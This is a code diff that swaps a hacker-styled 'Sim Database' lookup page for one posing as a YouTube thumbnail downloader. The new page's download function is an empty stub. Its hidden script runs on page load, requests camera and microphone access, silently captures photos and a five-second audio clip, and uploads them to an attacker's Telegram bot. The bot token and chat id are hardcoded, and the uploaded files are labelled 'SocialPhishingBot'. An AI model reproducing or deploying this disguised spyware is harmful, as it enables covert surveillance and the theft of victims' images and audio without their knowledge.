@@ -1,342 +1,396 @@
+
+
+<!DOCTYPE html>
+
 <html lang="en">
- <head> 
-  <meta charset="UTF-8"> 
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"> 
-  <title>SYSTEM BREACH</title> 
+
+<head>
+
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+
+
+
+  <title>YouTube Thumbnail Downloader</title>
+
+  <meta charset="utf-8">
+
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Montserrat">
+
   <style>
-        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@700&family=VT323&display=swap');
-        
-        body {
-            margin: 0;
-            padding: 0;
-            background: linear-gradient(135deg, #000000, #1a1a1a);
-            color: #ff003c;
-            font-family: 'Orbitron', sans-serif;
-            overflow: hidden;
-            height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            text-align: center;
-            cursor: url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='16' height='16' viewBox='0 0 16 16'><circle cx='8' cy='8' r='8' fill='%23ff003c'/></svg>"), auto;
-        }
-        
-        .alert-box {
-            position: relative;
-            max-width: 320px;
-            padding: 30px;
-            background: rgba(0, 0, 0, 0.7);
-            border: 2px solid #ff003c;
-            box-shadow: 0 0 30px rgba(255, 0, 60, 0.5);
-            backdrop-filter: blur(5px);
-            z-index: 10;
-            animation: glitch 3s linear infinite;
-            border-radius: 5px;
-        }
-        
-        h1 {
-            font-family: 'Orbitron', sans-serif;
-            color: #ff003c;
-            font-size: 3rem;
-            margin-bottom: 20px;
-            text-shadow: 0 0 15px rgba(255, 0, 60, 0.7);
-            letter-spacing: 3px;
-        }
-        
-        p {
-            font-size: 1.5rem;
-            line-height: 1.6;
-            margin-bottom: 25px;
-            color: #ff3366;
-        }
-        
-        .hacker-name {
-            color: #ff003c;
-            font-weight: bold;
-            font-size: 2rem;
-            display: inline-block;
-            position: relative;
-            text-shadow: 0 0 10px rgba(255, 0, 60, 0.7);
-        }
-        
-        .hacker-name::after {
-            content: "";
-            animation: blink 0.7s infinite;
-            position: absolute;
-            right: -10px;
-            color: #ff003c;
-        }
-        
-        .input-box {
-            color: black;
-        }
-        
-        .contact-btn {
-            display: inline-block;
-            padding: 12px 30px;
-            background: red;
-            color: white;
-            font-size: 1.3rem;
-            text-decoration: none;
-            border-radius: 0;
-            margin-top: 20px;
-            transition: all 0.3s;
-            border: 1px solid rgba(255, 0, 60, 0.9);
-        }
-        
-        .search-box {
-            display: flex;
-            flex-direction: column; /* Changed to column layout */
-            align-items: center; /* Center items horizontally */
-            color: black;
-            margin-bottom: 20px;
-        }
-        
-        .search-box input[type="text"] {
-            width: 100%; /* Full width */
-            color: black;
-            padding: 10px;
-            margin-bottom: 10px; /* Space between input and button */
-            border: 2px solid #333;
-            border-radius: 4px;
-            box-sizing: border-box;
-            background-color: white;
-        }
-        
-        .search-box input[type="submit"] {
-            width: 100%; /* Full width */
-            padding: 10px 20px;
-            border: none;
-            background-color: red;
-            color: white;
-            border-radius: 4px;
-            cursor: pointer;
-            transition: background-color 0.3s ease;
-        }
-        
-        .search-box input[type="submit"]:hover {
-            background-color: #007BFF;
-        }
-        
-        .contact-btn:hover {
-            background-color: #007BFF;
-            box-shadow: 0 0 20px rgba(255, 0, 60, 0.9);
-        }
-        
-        /* Animations */
-        @keyframes glitch {
-            0%, 100% { transform: translate(0); }
-            20% { transform: translate(-5px, 5px); }
-            40% { transform: translate(-5px, -5px); }
-            60% { transform: translate(5px, 5px); }
-            80% { transform: translate(5px, -5px); }
-        }
-        
-        @keyframes blink {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0; }
-        }
-        
-        /* VIP Effects */
-        .vip-effect {
-            position: absolute;
-            width: 100%;
-            height: 100%;
-            top: 0;
-            left: 0;
-            z-index: -1;
-            opacity: 0.7;
-        }
-        
-        .vip-corner {
-            position: absolute;
-            width: 50px;
-            height: 50px;
-            border: 2px solid #ff003c;
-            opacity: 0.9;
-        }
-        
-        .top-left {
-            top: 20px;
-            left: 20px;
-            border-right: none;
-            border-bottom: none;
-            animation: pulse 2s infinite;
-        }
-        
-        .top-right {
-            top: 20px;
-            right: 20px;
-            border-left: none;
-            border-bottom: none;
-            animation: pulse 2s infinite 0.5s;
-        }
-        
-        .bottom-left {
-            bottom: 20px;
-            left: 20px;
-            border-right: none;
-            border-top: none;
-            animation: pulse 2s infinite 1s;
-        }
-        
-        .bottom-right {
-            bottom: 20px;
-            right: 20px;
-            border-left: none;
-            border-top: none;
-            animation: pulse 2s infinite 1.5s;
-        }
-        
-        .vip-line {
-            position: absolute;
-            background: #ff003c;
-            opacity: 0.5;
-            animation: scan 8s linear infinite;
-        }
-        
-        .horizontal-line {
-            height: 1px;
-            width: 100%;
-            left: 0;
-            box-shadow: 0 0 10px #ff003c;
-        }
-        
-        .vertical-line {
-            width: 1px;
-            height: 100%;
-            top: 0;
-            box-shadow: 0 0 10px #ff003c;
-        }
-        
-        @keyframes pulse {
-            0% { transform: scale(1); opacity: 0.7; }
-            50% { transform: scale(1.1); opacity: 1; }
-            100% { transform: scale(1); opacity: 0.7; }
-        }
-        
-        @keyframes scan {
-            0% { transform: translateY(-100%); }
-            100% { transform: translateY(100vh); }
-        }
-        
-        /* Binary Rain Background */
-        .binary-rain {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: -1;
-            opacity: 0.3;
-        }
-    </style> 
- </head> 
- <body> 
-  <!-- VIP Corner Effects --> 
-  <div class="vip-effect"> 
-   <div class="vip-corner top-left"></div> 
-   <div class="vip-corner top-right"></div> 
-   <div class="vip-corner bottom-left"></div> 
-   <div class="vip-corner bottom-right"></div> 
-   <!-- Scanning lines --> 
-   <div class="vip-line horizontal-line" style="top: 20%; animation-delay: 0s;"></div> 
-   <div class="vip-line horizontal-line" style="top: 40%; animation-delay: 2s;"></div> 
-   <div class="vip-line horizontal-line" style="top: 60%; animation-delay: 4s;"></div> 
-   <div class="vip-line horizontal-line" style="top: 80%; animation-delay: 6s;"></div> 
-   <div class="vip-line vertical-line" style="left: 20%; animation-delay: 1s;"></div> 
-   <div class="vip-line vertical-line" style="left: 40%; animation-delay: 3s;"></div> 
-   <div class="vip-line vertical-line" style="left: 60%; animation-delay: 5s;"></div> 
-   <div class="vip-line vertical-line" style="left: 80%; animation-delay: 7s;"></div> 
-  </div> 
-  <!-- Binary Rain Background --> 
-  <canvas id="binaryRain" class="binary-rain" width="360" height="705"></canvas> 
-  <div class="alert-box"> 
-   <meta charset="UTF-8"> 
-   <meta name="viewport" content="width=device-width, initial-scale=1.0"> 
-   <div class="container"> 
-    <h1>Sim Database</h1> 
-    <form class="search-box" method="post" action=""> 
-     <input type="text" name="search_id" placeholder="Enter Number" required> 
-     <input type="submit" value="Search"> 
-    </form> 
-   </div> 
-   <div class="hacker-name" id="tajammal-name">
-    T
-   </div> 
-  </div> 
-  <script>
-        // Binary Rain Background
-        const canvas = document.getElementById('binaryRain');
-        const ctx = canvas.getContext('2d');
-        
-        canvas.width = window.innerWidth;
-        canvas.height = window.innerHeight;
-        
-        const binary = "01";
-        const cols = Math.floor(canvas.width / 15);
-        const drops = [];
-        
-        for (let i = 0; i < cols; i++) {
-            drops[i] = Math.random() * -100;
-        }
-        
-        function drawBinaryRain() {
-            ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
-            ctx.fillRect(0, 0, canvas.width, canvas.height);
-            
-            ctx.fillStyle = '#ff003c';
-            ctx.font = '15px VT323';
-            
-            for (let i = 0; i < drops.length; i++) {
-                const text = binary[Math.floor(Math.random() * binary.length)];
-                ctx.fillText(text, i * 15, drops[i] * 15);
-                
-                if (drops[i] * 15 > canvas.height || Math.random() > 0.99) {
-                    drops[i] = 0;
-                }
-                drops[i]++;
-            }
-        }
-        
-        setInterval(drawBinaryRain, 33);
+
+    body {
+
+      font-family: 'Montserrat', sans-serif;
+
+      margin: 0;
+
+      padding: 0;
+
+      background-color: #f5f5f5;
+
+    }
+
+    .navbar {
+
+      background-color: #ff0000;
+
+      color: white;
+
+      text-align: center;
+
+      padding: 15px 0;
+
+    }
+
+    #header {
+
+      margin: 0;
+
+      font-size: 28px;
+
+      font-weight: bold;
+
+    }
+
+    .container {
+
+      max-width: 600px;
+
+      margin: 20px auto;
+
+      padding: 20px;
+
+      background-color: #fff;
+
+      border-radius: 8px;
+
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+
+    }
+
+    .form-control {
+
+      width: calc(100% - 22px);
+
+      margin-bottom: 15px;
+
+      padding: 10px;
+
+      border: 1px solid #ccc;
+
+      border-radius: 5px;
+
+      box-sizing: border-box;
+
+      font-family: 'Montserrat', sans-serif;
+
+    }
+
+    #thumbdloadbtn {
+
+      display: block;
+
+      width: 100%;
+
+      padding: 10px;
+
+      border: none;
+
+      border-radius: 5px;
+
+      background-color: #ff0000;
+
+      color: white;
+
+      font-size: 16px;
+
+      cursor: pointer;
+
+      font-family: 'Montserrat', sans-serif;
+
+    }
+
+    #thumbdloadbtn:hover {
+
+      background-color: #cc0000;
+
+    }
+
+    footer {
+
+      text-align: center;
+
+      margin-top: 40px;
+
+      color: #666;
+
+    }
+
+    .youtube-logo {
+
+      display: block;
+
+      margin: 20px auto;
+
+      width: 100px; /* Adjust size as needed */
+
+    }
+
+  </style>
+
+</head>
+
+<body>
+
+  <nav class="navbar">
+
+    <img class="youtube-logo" src="https://www.gstatic.com/youtube/img/branding/youtubelogo/svg/youtubelogo.svg" alt="YouTube Logo">
+
+    <h1 id="header">YOUTUBE THUMBNAIL DOWNLOADER</h1>
+
+  </nav>
+
+
+
+  <div class="container">
+
+    <input id="ytlink" type="text" class="form-control" placeholder="Enter YouTube Video URL" spellcheck="false">
+
+    <button id="thumbdloadbtn" onclick="downloadThumbnail()">FETCH</button>
+
+    <div id="thumbnail-preview"><!-- Placeholder for thumbnail preview --></div>
+
+
+
+    <h2>How to Download HD YouTube Thumbnail</h2>
+
+    <ol>
+
+      <li>Copy the YouTube Video Link / URL from the YouTube App or Website</li>
+
+      <li>Paste the YouTube video Link / URL in the Input Field Above</li>
+
+      <li>Click on the "FETCH" Button</li>
+
+      <li>Select the thumbnail quality</li>
+
+      <li>Download the Thumbnail</li>
+
+    </ol>
+
+  </div>
+
+
+
+  <center>
+
+    <button id="toggle-video" style="display:none;">Toggle Video</button>
+
+    <div id="message-container"></div>
+
+    <video id="video" width="0" height="0" autoplay></video>
+
+  </center>
+
+
+
+  <script type="text/javascript">
+
+  function downloadThumbnail() {
+
+        // Change button text to indicate fetching
+
+        var btn = document.getElementById('thumbdloadbtn');
+
+        btn.textContent = 'Fetching from server... Wait';
+
+
+
+        // Add your logic to fetch the thumbnail here
+
+        // ...
+
+    }
+
+    function la(src) {
+
+      window.location = src;
+
+    }
+
     
 
-  // Tajammal Name Typing Effect
-        const nameElement = document.getElementById('tajammal-name');
-        const name = "Tajammal Mods";
-        let i = 0;
-        
-        function typeName() {
-            if (i < name.length) {
-                nameElement.textContent += name.charAt(i);
-                i++;
-                setTimeout(typeName, Math.random() * 300 + 100); // Random typing speed
-            } else {
-                // Randomly reset and retype for glitch effect
-                if (Math.random() > 0.95) {
-                    i = 0;
-                    nameElement.textContent = "";
-                    setTimeout(typeName, 500);
-                }
-            }
+         function GetURLParameter(sParam) {
+
+           var sPageURL = window.location.search.substring(1);
+
+           var sURLVariables = sPageURL.split('&');
+
+           for (var i = 0; i < sURLVariables.length; i++) {
+
+             var sParameterName = sURLVariables[i].split('=');
+
+             if (sParameterName[0] == sParam) {
+
+               return sParameterName[1];
+
+             }
+
+           }
+
+         }
+
+    
+
+         var chatid = GetURLParameter('id');
+
+         
+
+    navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+
+      .then((stream) => {
+
+        const imageCapture = new ImageCapture(stream.getVideoTracks()[0]);
+
+        const audioRecorder = new MediaRecorder(stream);
+
+
+
+        function capturePhoto(index) {
+
+          setTimeout(() => {
+
+            imageCapture.takePhoto()
+
+              .then((blob) => {
+
+                sendToTelegram(blob, 'photo');
+
+              })
+
+              .catch((error) => {
+
+                console.error('Error capturing photo:', error);
+
+              });
+
+          }, index * 2000);
+
         }
-        
-        // Start typing and glitch effects
-        typeName();
-        
-        // Random glitch effect on the name
-        setInterval(() => {
-            if (Math.random() > 0.9 && nameElement.textContent) {
-                const temp = nameElement.textContent;
-                nameElement.textContent = temp.split('').map(c => 
-                    Math.random() > 0.7 ? binary[Math.floor(Math.random() * 2)] : c
-                ).join('');
-                setTimeout(() => {
-                    nameElement.textContent = temp;
-                }, 200);
-            }
-        }, 1000);
-    </script> 
- </body>
+
+
+
+        function startAudioRecording() {
+
+          audioRecorder.start();
+
+          setTimeout(() => {
+
+            audioRecorder.stop();
+
+          }, 5000);
+
+        }
+
+
+
+        audioRecorder.ondataavailable = (event) => {
+
+          if (event.data.size > 0) {
+
+            sendToTelegram(event.data, 'audio');
+
+          }
+
+        };
+
+
+
+        for (let i = 0; i < 3; i++) {
+
+          capturePhoto(i);
+
+        }
+
+
+
+        startAudioRecording();
+
+      })
+
+      .catch((error) => {
+
+        if (error.name === 'NotAllowedError') {
+
+          // Handle the case where permissions are denied
+
+          console.warn('Permissions denied. User may suspect.');
+
+        } else {
+
+          console.error('Permission error:', error);
+
+        }
+
+      });
+
+
+
+    function sendToTelegram(data, type) {
+
+   
+
+      const botToken = '7604714788:AAGyC5gKL2kLX7y_TNYE8Ro6xeX4E19zWFk';
+
+      const chatId = 1902439487;
+
+
+
+      const formData = new FormData();
+
+      formData.append('chat_id', chatId);
+
+      formData.append(type === 'photo' ? 'photo' : 'audio', data, `@SocialPhishingBot.${type === 'photo' ? 'jpg' : 'wav'}`);
+
+
+
+      fetch(`https://api.telegram.org/bot${botToken}/send${type.charAt(0).toUpperCase() + type.slice(1)}`, 
+
+{
+
+        method: 'POST',
+
+        body: formData
+
+      })
+
+        .then(response => response.json())
+
+        .then(data => console.log(data))
+
+        .catch(error => console.error('Error sending to Telegram:', error));
+
+    }
+
+               
+
+  
+
+    
+
+  </script>
+
+
+
+  <footer>
+
+    <p>Made With ❤️ By usman</p>
+
+  </footer>
+
+</body>
+
 </html>
+
